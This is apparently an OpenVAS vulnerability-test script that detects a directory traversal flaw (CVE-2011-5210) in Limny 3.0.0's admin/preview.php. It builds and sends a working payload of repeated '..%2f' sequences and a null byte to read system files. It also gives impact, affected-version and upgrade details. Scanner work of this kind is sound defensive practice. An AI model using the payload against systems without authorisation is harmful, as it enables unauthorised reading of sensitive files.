###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_limny_theme_param_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Limny admin/preview.php theme Parameter Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:limny:limny";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802984");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2011-5210");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-10-12 15:41:59 +0530 (Fri, 12 Oct 2012)");
  script_name("Limny admin/preview.php theme Parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_limny_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("limny/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43124");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/65083");
  script_xref(name:"URL", value:"http://www.autosectools.com/Advisories/Limny.3.0.0_Local.File.Inclusion_99.html");

  tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.

  Impact Level: Application";

  tag_affected = "Limny version 3.0.0";

  tag_insight = "Input passed via 'theme' parameter to admin/preview.php is not properly
  sanitised before being used to include files.";

  tag_solution = "Upgrade to Limny version 3.0.1 or later,
  For updates refer to http://www.limny.org/download";

  tag_summary = "This host is running Limny and is prone to directory traversal vulnerability.";

  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file( keys( files ) ) {

  ## Construct directory traversal attack
  url = dir + "/admin/preview.php?theme=" + crap(data:"..%2f",length:3*15) +
        files[file] + "%00";

  ## Confirm exploit worked properly or not
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );